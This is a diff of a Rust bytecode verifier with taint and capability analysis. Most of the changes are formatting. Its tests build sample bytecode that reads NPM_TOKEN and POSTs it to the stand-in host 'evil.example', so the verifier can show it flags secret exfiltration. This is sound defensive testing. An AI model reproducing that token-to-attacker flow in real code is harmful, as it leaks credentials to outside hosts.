@@ -5,9 +5,7 @@ use std::error::Error;
 use std::fmt;
 
 use omc_cap::{Capability, Policy, Sink};
-use omc_format::{
-    BehaviorType, CapOp, Function, FunctionId, ImportId, Module, ModuleId, Op,
-};
+use omc_format::{BehaviorType, CapOp, Function, FunctionId, ImportId, Module, ModuleId, Op};
 use omc_taint::Label;
 
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -63,11 +61,7 @@ pub struct VerificationReport {
 /// graph. One engine consumes either resolver, so the taint analysis is shared.
 pub trait CalleeResolver {
     /// Resolve a `CallLocal(id)` issued from `module_id` to a callee body.
-    fn resolve_local<'a>(
-        &'a self,
-        module_id: &ModuleId,
-        id: FunctionId,
-    ) -> Option<CalleeRef<'a>>;
+    fn resolve_local<'a>(&'a self, module_id: &ModuleId, id: FunctionId) -> Option<CalleeRef<'a>>;
 
     /// Resolve a `CallImport(import)` issued from `module_id`. Returns `None`
     /// for a single-module resolver (the import body is foreign / unknown).
@@ -96,11 +90,7 @@ struct ModuleResolver<'a> {
 }
 
 impl CalleeResolver for ModuleResolver<'_> {
-    fn resolve_local<'a>(
-        &'a self,
-        module_id: &ModuleId,
-        id: FunctionId,
-    ) -> Option<CalleeRef<'a>> {
+    fn resolve_local<'a>(&'a self, module_id: &ModuleId, id: FunctionId) -> Option<CalleeRef<'a>> {
         if *module_id != self.module.id {
             return None;
         }
@@ -146,12 +136,7 @@ fn verify_module_with_resolver(
         // (external/user input). Context-sensitive callee analysis fires from
         // here for any CallLocal/CallImport reached.
         let arg_labels = vec![Label::Public; function.args as usize];
-        let summary = engine.analyze(
-            &module.id,
-            function,
-            module.declared_behavior,
-            &arg_labels,
-        );
+        let summary = engine.analyze(&module.id, function, module.declared_behavior, &arg_labels);
         findings.extend(summary.findings);
         observed_capabilities.extend(summary.observed_capabilities);
     }
@@ -215,11 +200,7 @@ impl<R> CalleeResolver for ProgramResolver<'_, R>
 where
     R: Fn(&ModuleId, ImportId) -> Option<(ModuleId, FunctionId)>,
 {
-    fn resolve_local<'a>(
-        &'a self,
-        module_id: &ModuleId,
-        id: FunctionId,
-    ) -> Option<CalleeRef<'a>> {
+    fn resolve_local<'a>(&'a self, module_id: &ModuleId, id: FunctionId) -> Option<CalleeRef<'a>> {
         let module = self.modules.get(module_id)?;
         let function = module.function(id)?;
         // Return a borrow keyed by the module's stored id so the namespace
@@ -350,9 +331,7 @@ fn successors(function: &Function, index: usize) -> Vec<usize> {
     match &function.code[index] {
         // Returns and traps terminate the path; no successors.
         Op::Return | Op::Trap(_) => Vec::new(),
-        Op::Jmp(offset) => jump_target(index, *offset, code_len)
-            .into_iter()
-            .collect(),
+        Op::Jmp(offset) => jump_target(index, *offset, code_len).into_iter().collect(),
         Op::JmpIfFalse(offset) => {
             let mut edges = vec![index + 1];
             if let Some(target) = jump_target(index, *offset, code_len) {
@@ -623,7 +602,10 @@ impl<'a> InterpEngine<'a> {
             // LoadArg yields the actual caller-supplied argument label (not
             // always Public): fixes H2 laundering through argument passing.
             Op::LoadArg(i) => {
-                let label = arg_labels.get(*i as usize).cloned().unwrap_or(Label::Public);
+                let label = arg_labels
+                    .get(*i as usize)
+                    .cloned()
+                    .unwrap_or(Label::Public);
                 stack.push(label);
             }
             Op::LoadLocal(id) => {
@@ -636,8 +618,17 @@ impl<'a> InterpEngine<'a> {
                     *slot = label;
                 }
             }
-            Op::Add | Op::Sub | Op::Mul | Op::Div | Op::Mod | Op::Eq | Op::Lt | Op::Gt | Op::Le
-            | Op::Ge | Op::Index => {
+            Op::Add
+            | Op::Sub
+            | Op::Mul
+            | Op::Div
+            | Op::Mod
+            | Op::Eq
+            | Op::Lt
+            | Op::Gt
+            | Op::Le
+            | Op::Ge
+            | Op::Index => {
                 let right = pop(&mut stack);
                 let left = pop(&mut stack);
                 stack.push(left.join(right));
@@ -741,14 +732,32 @@ impl<'a> InterpEngine<'a> {
         let mut stack = state.stack.clone();
 
         match op {
-            Op::Const(_) | Op::LoadArg(_) | Op::LoadLocal(_) | Op::Jmp(_) | Op::Return
+            Op::Const(_)
+            | Op::LoadArg(_)
+            | Op::LoadLocal(_)
+            | Op::Jmp(_)
+            | Op::Return
             | Op::Trap(_) => {}
-            Op::StoreLocal(_) | Op::Len | Op::Not | Op::JsonParse | Op::JsonStringify | Op::Pop
+            Op::StoreLocal(_)
+            | Op::Len
+            | Op::Not
+            | Op::JsonParse
+            | Op::JsonStringify
+            | Op::Pop
             | Op::JmpIfFalse(_) => {
                 require_depth(function, index, &stack, 1, findings);
             }
-            Op::Add | Op::Sub | Op::Mul | Op::Div | Op::Mod | Op::Eq | Op::Lt | Op::Gt | Op::Le
-            | Op::Ge | Op::Index => {
+            Op::Add
+            | Op::Sub
+            | Op::Mul
+            | Op::Div
+            | Op::Mod
+            | Op::Eq
+            | Op::Lt
+            | Op::Gt
+            | Op::Le
+            | Op::Ge
+            | Op::Index => {
                 require_depth(function, index, &stack, 2, findings);
             }
             Op::Slice => {
@@ -929,8 +938,11 @@ fn report_cap_flow(
     findings: &mut Vec<VerifyFinding>,
 ) {
     match cap {
-        CapOp::EnvRead { .. } | CapOp::FsRead { .. } | CapOp::DnsLookup { .. }
-        | CapOp::TimeNow | CapOp::RandomBytes { .. } => {}
+        CapOp::EnvRead { .. }
+        | CapOp::FsRead { .. }
+        | CapOp::DnsLookup { .. }
+        | CapOp::TimeNow
+        | CapOp::RandomBytes { .. } => {}
         CapOp::FsWrite {
             path,
             value_from_stack,
@@ -1229,7 +1241,7 @@ mod tests {
                 Op::StoreLocal(0),
                 Op::Const(Value::Int(0)),
                 Op::StoreLocal(1),
-                Op::LoadLocal(1),  // 4 loop head
+                Op::LoadLocal(1), // 4 loop head
                 Op::LoadArg(0),
                 Op::Lt,
                 Op::JmpIfFalse(9), // 7 -> 17 (exit)
@@ -1308,7 +1320,12 @@ mod tests {
     #[test]
     fn rejects_unreachable_instruction() {
         let module = pure_module(
-            vec![Op::Const(Value::Int(1)), Op::Return, Op::Const(Value::Int(2)), Op::Return],
+            vec![
+                Op::Const(Value::Int(1)),
+                Op::Return,
+                Op::Const(Value::Int(2)),
+                Op::Return,
+            ],
             0,
         );
         let err = verify_module(&module, &Policy::pure()).unwrap_err();
@@ -1534,18 +1551,12 @@ mod tests {
                         Op::Return,
                     ],
                 ),
-                Function::new(
-                    1,
-                    "identity",
-                    1,
-                    vec![Op::LoadArg(0), Op::Return],
-                ),
+                Function::new(1, "identity", 1, vec![Op::LoadArg(0), Op::Return]),
             ],
         );
         // Only the env-read capability is granted; no flow grant needed because
         // nothing flows to a sink.
-        let policy =
-            Policy::pure().allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()));
+        let policy = Policy::pure().allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()));
         verify_module(&module, &policy).unwrap();
     }
 
@@ -1683,8 +1694,7 @@ mod tests {
                 ],
             )],
         );
-        let policy =
-            Policy::pure().allow_capability(Capability::ProcSpawn("echo".to_owned()));
+        let policy = Policy::pure().allow_capability(Capability::ProcSpawn("echo".to_owned()));
         verify_module(&module, &policy).unwrap();
     }
 
@@ -2273,16 +2283,16 @@ mod tests {
                                 "evil.example",
                             ),
                         }), // 1  d1: POST(arg) -- SINK consumes the arg
-                        Op::Pop,           // 2  d1->d0
-                        Op::LoadArg(0),    // 3  d0->d1 cond
+                        Op::Pop,        // 2  d1->d0
+                        Op::LoadArg(0), // 3  d0->d1 cond
                         Op::JmpIfFalse(3), // 4  d1->d0 -> 8 base
                         Op::Cap(CapOp::EnvRead {
                             name: "NPM_TOKEN".to_owned(),
                         }), // 5  d0->d1 secret
                         Op::CallLocal(0), // 6  d1: pop arg, push ret (recurse w/ secret)
-                        Op::Return,        // 7  d1
+                        Op::Return,     // 7  d1
                         Op::Const(Value::Unit), // 8  base d0->d1
-                        Op::Return,        // 9  d1
+                        Op::Return,     // 9  d1
                     ],
                 ),
                 Function::new(
@@ -2543,7 +2553,12 @@ mod tests {
             version: "0.0.0".to_owned(),
             declared_behavior: BehaviorType::Pure,
             functions: vec![
-                Function::new(0, "f0", 1, vec![Op::LoadArg(0), Op::CallLocal(1), Op::Return]),
+                Function::new(
+                    0,
+                    "f0",
+                    1,
+                    vec![Op::LoadArg(0), Op::CallLocal(1), Op::Return],
+                ),
                 Function::new(
                     1,
                     "f1",
